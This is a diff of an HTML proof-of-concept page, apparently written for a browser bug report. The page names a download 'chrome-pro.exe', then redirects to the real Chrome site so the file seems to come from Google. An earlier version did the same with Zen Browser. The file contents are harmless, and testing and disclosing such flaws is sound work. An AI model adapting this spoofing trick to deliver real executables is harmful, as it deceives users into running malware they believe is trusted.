@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Poc Test Download Spoofing (zen-app-pro.exe)</title>
+<title>Poc Download Spoofing</title>
 <style>
   :root { color-scheme: dark; }
   body {
@@ -11,7 +11,7 @@
     background: #0d0f12; color: #e6e8eb;
     font: 15px/1.6 system-ui, -apple-system, "Segoe UI", sans-serif;
   }
-  main { width: min(560px, 92vw); padding: 40px 0; text-align: center; }
+  main { width: min(520px, 92vw); padding: 40px 0; text-align: center; }
   h1 { font-size: 20px; margin: 0 0 8px; }
   p { color: #9aa3ad; margin: 0 0 24px; }
   button {
@@ -23,20 +23,20 @@
 </head>
 <body>
 <main>
-  <h1>Poc Test Download Spoofing (zen-app-pro.exe)</h1>
-  <p>Click to download. The page then opens the Zen site.</p>
+  <h1>Poc Download Spoofing</h1>
+  <p>Click to download. The page then opens the Chrome site.</p>
   <button id="go">Download</button>
 </main>
 
 <script>
   document.getElementById("go").onclick = () => {
     const a = document.createElement("a");
-    a.href = "data:,https://zen-browser.app";
-    a.download = "zen-app-pro.exe";
+    a.href = "data:,https://chrome.google.com";
+    a.download = "chrome-pro.exe";
     a.click();
 
     setTimeout(() => {
-      location.href = "https://zen-browser.app/";
+      location.href = "https://www.google.com/chrome/";
     }, 2000);
   };
 </script>
